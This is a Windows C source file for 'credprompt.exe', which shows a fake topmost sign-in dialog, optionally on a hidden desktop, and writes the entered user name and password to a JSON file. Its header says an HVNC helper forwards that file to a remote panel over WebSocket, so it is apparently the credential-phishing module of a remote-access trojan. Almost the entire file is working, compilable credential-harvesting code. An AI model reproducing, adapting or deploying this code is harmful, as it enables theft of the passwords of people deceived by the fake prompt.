/* fleet credential prompt (Windows).
 *
 * A compact sign-in dialog that can be launched on the visible or a hidden
 * desktop. On submit it appends one JSON line to the --out file:
 *   {"t":"creds","user":"...","pass":"...","source":"prompt"}
 * The rd/HVNC helper tails that file and forwards it to the panel over the rd
 * WebSocket, where it is stored and alerted.
 *
 * usage: credprompt.exe --out C:\Windows\Temp\fleet-creds.json [--title "..."]
 */
#include <windows.h>
#include <stdio.h>
#include <string.h>

static char g_out[MAX_PATH] = "fleet-creds.json";
static char g_title[128] = "Sign in";
static HWND g_user;
static HWND g_pass;

static void json_escape(const char *in, char *out, size_t cap) {
    size_t o = 0;
    for (size_t i = 0; in[i] && o + 2 < cap; i++) {
        char c = in[i];
        if (c == '"' || c == '\\') {
            out[o++] = '\\';
        }
        if (c == '\n') {
            c = ' ';
        }
        out[o++] = c;
    }
    out[o] = 0;
}

static void write_cred(void) {
    char user[256] = {0}, pass[256] = {0}, eu[512], ep[512];
    GetWindowTextA(g_user, user, (int)sizeof(user));
    GetWindowTextA(g_pass, pass, (int)sizeof(pass));
    json_escape(user, eu, sizeof(eu));
    json_escape(pass, ep, sizeof(ep));
    FILE *f = fopen(g_out, "a");
    if (f) {
        fprintf(f,
                "{\"t\":\"creds\",\"user\":\"%s\",\"pass\":\"%s\",\"source\":\"prompt\"}\n",
                eu, ep);
        fclose(f);
    }
}

static LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
    switch (msg) {
        case WM_CREATE: {
            CreateWindowA("STATIC", g_title, WS_CHILD | WS_VISIBLE, 20, 16, 320, 24, hwnd, NULL,
                          NULL, NULL);
            CreateWindowA("STATIC", "User name", WS_CHILD | WS_VISIBLE, 20, 52, 120, 20, hwnd,
                          NULL, NULL, NULL);
            g_user = CreateWindowExA(WS_EX_CLIENTEDGE, "EDIT", "", WS_CHILD | WS_VISIBLE | WS_TABSTOP,
                                     20, 74, 320, 26, hwnd, (HMENU)101, NULL, NULL);
            CreateWindowA("STATIC", "Password", WS_CHILD | WS_VISIBLE, 20, 108, 120, 20, hwnd,
                          NULL, NULL, NULL);
            g_pass = CreateWindowExA(WS_EX_CLIENTEDGE, "EDIT", "",
                                     WS_CHILD | WS_VISIBLE | WS_TABSTOP | ES_PASSWORD, 20, 130,
                                     320, 26, hwnd, (HMENU)102, NULL, NULL);
            CreateWindowA("BUTTON", "Sign in", WS_CHILD | WS_VISIBLE | BS_DEFPUSHBUTTON, 240, 170,
                          100, 30, hwnd, (HMENU)1, NULL, NULL);
            SetFocus(g_user);
            return 0;
        }
        case WM_COMMAND:
            if (LOWORD(wp) == 1) {
                write_cred();
                DestroyWindow(hwnd);
            }
            return 0;
        case WM_CLOSE:
            DestroyWindow(hwnd);
            return 0;
        case WM_DESTROY:
            PostQuitMessage(0);
            return 0;
    }
    return DefWindowProcA(hwnd, msg, wp, lp);
}

int WINAPI WinMain(HINSTANCE inst, HINSTANCE prev, LPSTR cmd, int show) {
    (void)inst; (void)prev; (void)cmd; (void)show;
    int argc = 0;
    LPWSTR *argv = CommandLineToArgvW(GetCommandLineW(), &argc);
    if (argv) {
        for (int i = 1; i + 1 < argc; i++) {
            char key[64] = {0};
            WideCharToMultiByte(CP_ACP, 0, argv[i], -1, key, sizeof(key), NULL, NULL);
            char val[MAX_PATH] = {0};
            WideCharToMultiByte(CP_ACP, 0, argv[i + 1], -1, val, sizeof(val), NULL, NULL);
            if (strcmp(key, "--out") == 0) {
                strncpy(g_out, val, sizeof(g_out) - 1);
                i++;
            } else if (strcmp(key, "--title") == 0) {
                strncpy(g_title, val, sizeof(g_title) - 1);
                i++;
            }
        }
        LocalFree(argv);
    }

    WNDCLASSA wc;
    memset(&wc, 0, sizeof(wc));
    wc.lpfnWndProc = WndProc;
    wc.hInstance = GetModuleHandleA(NULL);
    wc.lpszClassName = "FleetCred";
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    RegisterClassA(&wc);
    HWND hwnd = CreateWindowExA(WS_EX_TOPMOST, "FleetCred", g_title, WS_OVERLAPPED | WS_CAPTION |
                                    WS_SYSMENU, CW_USEDEFAULT, CW_USEDEFAULT, 380, 250, NULL, NULL,
                                wc.hInstance, NULL);
    if (!hwnd) return 1;
    ShowWindow(hwnd, SW_SHOW);
    UpdateWindow(hwnd);
    MSG msg;
    while (GetMessageA(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageA(&msg);
    }
    return 0;
}
